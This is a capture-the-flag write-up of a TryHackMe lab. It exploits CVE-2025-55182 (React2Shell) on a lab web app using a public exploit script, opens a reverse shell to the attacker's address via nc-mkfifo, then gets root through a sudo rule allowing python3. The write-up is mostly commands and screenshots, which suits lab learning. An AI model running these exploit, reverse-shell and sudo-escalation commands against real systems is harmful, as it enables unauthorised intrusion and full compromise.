# TryHackMe Corp Website Writeup

---

## use nucli

```
└─$ nuclei -u http://10.65.129.138:3000/
```

> ## found React2Shell vulnerability (CVE-2025-55182).

### [CVE-2025-55182](https://github.com/Chocapikk/CVE-2025-55182)

```
git clone https://github.com/Chocapikk/CVE-2025-55182.git    
```

<img width="888" height="386" alt="image" src="https://github.com/user-attachments/assets/dbe1ac7a-08a0-4a0f-ab9d-2cb9ef830db4" />

```
pip install -r requirements.txt
python3 exploit.py -u http://10.65.129.138:3000 -c "whoami"
```

<img width="1315" height="292" alt="image" src="https://github.com/user-attachments/assets/8ac2b16d-5939-4a2e-838c-dfae1be752bd" />

<img width="1031" height="322" alt="image" src="https://github.com/user-attachments/assets/2d63b1d7-d1ce-4a89-b564-d43d4377b718" />

## privesc 

```
python3 exploit.py -u http://10.65.129.138:3000 -c "sudo -l" 
```

<img width="949" height="312" alt="image" src="https://github.com/user-attachments/assets/8e464f81-5fdf-4627-a25e-1bea8dec3013" />

```
sudo -l
```

```
Matching Defaults entries for daniel on romance:
   
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for daniel:
    Defaults!/usr/sbin/visudo env_keep+="SUDO_EDITOR EDITOR VISUAL"

User daniel may run the following commands on romance:
    (root) NOPASSWD: /usr/bin/python3

```

```
python3 exploit.py -u http://10.65.129.138:3000 -r -l 192.168.168.188 -p 4444 -P nc-mkfifo
```

```
sudo python3 -c 'import os; os.system("/bin/ash")'
```

<img width="1318" height="672" alt="image" src="https://github.com/user-attachments/assets/d5928b80-23f7-4290-afcc-6d6b55a43392" />

